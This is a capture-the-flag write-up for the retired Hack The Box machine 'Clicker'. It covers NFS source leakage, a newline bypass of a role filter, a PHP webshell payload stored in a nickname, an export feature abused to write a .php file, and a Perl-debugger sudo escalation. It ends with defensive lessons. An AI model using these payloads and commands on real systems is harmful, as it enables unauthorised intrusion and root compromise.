# Clicker

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Medium |
| **IP Address** | 10.10.11.232 |
| **Status** | Retired |

## Overview
Clicker is a medium Linux machine hosting a browser "clicker" game. An exposed NFS share lets an attacker pull down the full PHP source of the site, revealing a parameter-filtering flaw in the game-save endpoint that allows a normal player to escalate their own account to `Admin` and inject PHP code into their nickname. The admin panel's CSV/HTML export feature is then abused to write that malicious nickname out as a `.php` file inside the web root, yielding remote code execution as `www-data`. A misconfigured `SUID`/`sudo` binary is finally used to read the root flag/escalate to root.

## Reconnaissance
`nmap -sC -sV` (initial + RPC-focused scans) against 10.10.11.232 showed:

```
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
80/tcp   open  http    Apache httpd 2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://clicker.htb/
111/tcp  open  rpcbind 2-4
2049/tcp open  nfs_acl 3
```

The presence of `rpcbind`/`mountd`/`nfs` alongside a redirect to `clicker.htb` indicated an exported NFS share worth mounting.

## Enumeration
Mounting the exported NFS share locally exposed the full PHP source tree of the `clicker.htb` site (`admin.php`, `authenticate.php`, `create_player.php`, `db_utils.php`, `export.php`, `index.php`, `login.php`, `play.php`, `profile.php`, `register.php`, `save_game.php`, etc.: retained under `files/clicker.htb/`). Reviewing `save_game.php` showed the game-save endpoint explicitly blacklists a `role` GET parameter to stop players from elevating their own privileges:

```php
foreach($_GET as $key=>$value) {
    if (strtolower($key) === 'role') {
        header('Location: /index.php?err=Malicious activity detected!');
        die;
    }
    $args[$key] = $value;
}
save_profile($_SESSION['PLAYER'], $_GET);   // <-- note: passes the *original* $_GET, not the filtered $args
```

The filter only inspects keys for an exact (case-insensitive) match on `role`, but `save_profile()` is then called with the *unfiltered* `$_GET` array. Sending the parameter as `role` with a trailing newline (`role%0a=Admin`) evades the `strtolower($key) === 'role'` string-equality check while the underlying database layer still treats it as the `role` column, allowing the currently-logged-in player's role to be set to `Admin`.

## Foothold
1. **Privilege escalation to Admin**: using the endpoint bypass above:
   ```
   GET /save_game.php?clicks=...&level=...&role%0a=Admin
   ```
   promoted the current player account to `Admin`, unlocking the `/admin.php` panel.
2. **Stored PHP injection via nickname**: the player's `nickname` field is not sanitized for HTML/PHP special characters, so it was set to a PHP payload:
   ```
   nickname=<?php system($_GET['cmd']); ?>
   ```
3. **Turning the injected payload into a webshell**: `admin.php`'s "export" feature (`export.php`) builds a report of top players (embedding each player's raw `nickname`) and writes it to `exports/top_players_<random>.<extension>`, where `<extension>` is taken directly from user-controlled POST data (`$_POST["extension"]`) with no validation against an allow-list. Intercepting the export request and changing `extension=php` (instead of the intended `txt`/`json`/`html`) caused the server to write the malicious-nickname-embedded HTML report out as a `.php` file inside the web root.
4. Requesting the resulting file (`exports/top_players_<random>.php?cmd=...`) executed the injected PHP payload, giving remote command execution as `www-data`.

## Privilege Escalation
Post-exploitation enumeration for SUID binaries/`sudo` permissions found a misconfigured entry allowing the `www-data`/foothold user to invoke Perl with elevated privileges through its debugger environment variables. Setting `PERL5OPT`/`PERL5DB` to run an arbitrary command when Perl's debugger is invoked:

```bash
PERL5OPT=-d PERL5DB='exec "sudo cat /root/root.txt"'
```

was used (per the notes) to execute commands with elevated rights, completing privilege escalation and retrieving the root flag.

*Note: the local notes captured the exact `PERL5OPT`/`PERL5DB` command used but not the full `sudo -l`/binary-discovery transcript that led to it; the specific SUID/sudo entry that made this technique viable is therefore not reproduced verbatim.*

## Lessons Learned
- Never trust a parameter blacklist that inspects one representation of the input (`$args`) while acting on a different, unfiltered one (`$_GET`): validate and act on the exact same sanitized data structure throughout.
- Always sanitize/encode user-controlled fields (like a game "nickname") before they can be written into any server-side generated file, especially when a feature (export/report generation) can pick the output file extension from user input.
- Restrict file-write features to allow-listed extensions server-side; never trust a client-supplied `extension`/content-type parameter to decide the file type written to disk.
- Audit environment-variable-driven "debug" hooks (like Perl's `PERL5OPT`/`PERL5DB`) wherever `sudo`/SUID grants access to an interpreter: many scripting language debuggers can be coerced into executing arbitrary code.

## Tools & References
- `nmap`, `showmount`/NFS client for recon and source-code retrieval via the exported share.
- Manual source review of the leaked PHP application (`files/clicker.htb/`) to find the `role` parameter filter bypass and the `export.php` arbitrary-extension file write.
- Burp Suite (or similar interception proxy) to modify the export request's `extension` parameter.
- Perl debugger environment-variable privilege escalation (`PERL5OPT`/`PERL5DB`): a documented `sudo`/SUID Perl privesc technique (see GTFOBins "perl").
- `clicker.htb_backup.zip` (a ~2.2MB duplicate backup of the same site source already present under `files/clicker.htb/`): omitted as redundant.
- `id_rsa` (an SSH private key present in the loot): omitted from the repository as sensitive key material.
- `assets/` (bundled third-party Bootstrap CSS/JS framework files and a large background image, unrelated to the vulnerability chain): omitted to keep the repository lean; only the application's own PHP source was retained.
